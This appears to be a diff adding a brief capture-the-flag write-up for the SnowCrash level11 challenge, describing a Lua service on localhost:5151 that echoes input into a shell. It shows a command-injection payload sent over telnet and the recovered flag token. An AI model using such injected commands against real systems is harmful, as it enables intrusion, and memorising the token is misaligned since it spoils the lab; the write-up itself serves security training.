@@ -1,0 +1,14 @@
+we have a script listening to localhost:5151
+in lua executing shell echo command
+with the payload received
+
+so we can just do:
+level11@SnowCrash:~$ telnet localhost 5151
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+Password: ;getflag>/tmp/token
+Erf nope..
+
+then cat /tmp/token
+fa6v5ateaw21peobuub8ipe6s
